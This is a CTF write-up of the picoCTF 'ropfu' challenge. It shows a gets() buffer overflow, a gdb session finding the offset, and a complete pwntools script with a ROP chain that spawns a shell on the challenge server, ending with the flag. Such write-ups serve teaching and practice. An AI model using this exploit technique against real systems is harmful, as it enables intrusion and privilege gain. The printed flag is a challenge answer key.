---
layout: post
title:  "ropfu"
grouped_by: picobin
---

### Description
> Can you exploit the following program to get the flag? Download source.
nc saturn.picoctf.net 53620

## Analysis

Opening the program vuln.c and reading through it
```c
void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}



```
We See a `gets` in vuln function so we can abuse buffer overflow here. But if you notice, there is no fuinction that reads a flag file or prints it. From the challenge it is now clear that we need to use ROP attack.

Running the executable just to see how it is printed.


## Solution

Lets build a rop chain using `ROPgadget`. We run the following command

```
[ctf] ROPgadget --binary ./vuln --ropchain
```


Towards the end of or output, we should be seeing our rop chain. We'll leverage this and write our code to send a payload to get hold of the shell. Before this, we need to find the offset of instruction pointer so that we can pad the payload before hand. For this we uise gdb, creaate pattern, send as input and find the offset.

```c
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
[+] Saved as '$_gef0'
gef➤  break main
Breakpoint 1 at 0x8049dc1
gef➤  c
The program is not being run.
gef➤  r
Starting program: /mnt/c/Users/hrakh/Downloads/ctf/vuln

Breakpoint 1, 0x08049dc1 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x080e685c  →  0xffffcdcc  →  0xffffcf29  →  "HOSTTYPE=x86_64"
$ebx   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$ecx   : 0x0
$edx   : 0xffffcd60  →  0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$esp   : 0xffffcd0c  →  0x0804a66d  →  <__libc_start_main+1309> add esp, 0x10
$ebp   : 0x0
$esi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$edi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$eip   : 0x08049dc1  →  <main+0> endbr32
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd0c│+0x0000: 0x0804a66d  →  <__libc_start_main+1309> add esp, 0x10        ← $esp
0xffffcd10│+0x0004: 0x00000001
0xffffcd14│+0x0008: 0xffffcdc4  →  0xffffcf03  →  "/mnt/c/Users/hrakh/Downloads/ctf/vuln"
0xffffcd18│+0x000c: 0xffffcdcc  →  0xffffcf29  →  "HOSTTYPE=x86_64"
0xffffcd1c│+0x0010: 0xffffcd60  →  0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
0xffffcd20│+0x0014: 0x00000000
0xffffcd24│+0x0018: 0x00000000
0xffffcd28│+0x001c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049dbc <vuln+55>        mov    ebx, DWORD PTR [ebp-0x4]
    0x8049dbf <vuln+58>        leave
    0x8049dc0 <vuln+59>        ret
 →  0x8049dc1 <main+0>         endbr32
    0x8049dc5 <main+4>         lea    ecx, [esp+0x4]
    0x8049dc9 <main+8>         and    esp, 0xfffffff0
    0x8049dcc <main+11>        push   DWORD PTR [ecx-0x4]
    0x8049dcf <main+14>        push   ebp
    0x8049dd0 <main+15>        mov    ebp, esp
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8049dc1 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049dc1 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  c
Continuing.
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
0x61616168 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffccc0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama"
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x080e5300  →  <_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah
$edx   : 0xffffccf2  →  0x5000ff00
$esp   : 0xffffcce0  →  "iaaajaaakaaalaaama"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$edi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$eip   : 0x61616168 ("haaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcce0│+0x0000: "iaaajaaakaaalaaama"         ← $esp
0xffffcce4│+0x0004: "jaaakaaalaaama"
0xffffcce8│+0x0008: "kaaalaaama"
0xffffccec│+0x000c: "laaama"
0xffffccf0│+0x0010: 0xff00616d ("ma"?)
0xffffccf4│+0x0014: 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
0xffffccf8│+0x0018: 0x00000000
0xffffccfc│+0x001c: 0x0804a66d  →  <__libc_start_main+1309> add esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616168
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x61616168 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset haaa
[+] Searching for '61616168'/'68616161' with period=4
[+] Found at offset 25 (little-endian search) likely

```

Offset starts at 25, so we go 24 + 4 extra bytes, 28 padding bytes.  
Our python code looks like this

```c
import sys
from pwn import *


#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b073a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b073a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e29) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0804a3c2) # int 0x80

session = remote(sys.argv[1], sys.argv[2])
session.recvuntil("grasshopper!")
session.sendline(b'A'*28 + p)
session.recv()
session.interactive()
```

And running this gives 

```
[ctf] python payload.py saturn.picoctf.net 53620                                                                                                                                                      
[+] Opening connection to saturn.picoctf.net on port 53620: Done
payload.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  session.recvuntil("grasshopper!")
[*] Switching to interactive mode
$ whoami
root
$ ls
flag.txt
vuln
$ cat flag.txt
picoCTF{5n47ch_7h3_5h311_4cbbb771}[*] Got EOF while reading in interactive
```

We get the flag `picoCTF{5n47ch_7h3_5h311_4cbbb771}`